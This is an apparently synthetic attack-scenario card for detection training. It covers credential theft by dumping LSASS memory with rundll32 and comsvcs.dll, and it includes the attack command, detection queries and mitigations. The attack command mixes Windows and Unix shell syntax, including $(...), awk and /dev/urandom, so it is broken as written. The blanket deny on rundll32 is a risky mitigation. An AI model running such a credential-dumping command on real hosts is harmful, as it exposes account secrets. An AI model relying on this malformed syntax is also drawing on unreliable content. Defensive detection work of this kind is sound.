---
type: campaign
scenario_id: 158
tactic: Credential Access
technique: "T1003.001: LSASS Memory"
technique_id: T1003.001
tags: [campaign, lotl, credential_access]
---

# Dumping LSASS memory using comsvcs.dll via rundll32.

## Threat Description
Dumping LSASS memory using comsvcs.dll via rundll32.

## Attack Command
```
rundll32 C:\Windows\System32\comsvcs.dll,MiniDump $(tasklist | findstr /i lsass | awk '{print $2}') $(echo dump$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dmp) full
```

## Detection Logic
Monitor rundll32 comsvcs: `wmic process where name='rundll32.exe' get commandline | findstr comsvcs`; Event ID 10 (Sysmon).

## Mitigation
Restrict rundll32: `icacls %windir%\System32\rundll32.exe /deny Everyone:RX`; Enable Credential Guard: `reg add HKLM\System\CurrentControlSet\Control\Lsa /v LsaCfgFlags /t REG_DWORD /d 2`.

## AI Training Prompt
Train AI to detect LSASS memory dumping and suggest Credential Guard.

## References
- MITRE ATT&CK T1003.001: https://attack.mitre.org/techniques/T1003/001/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
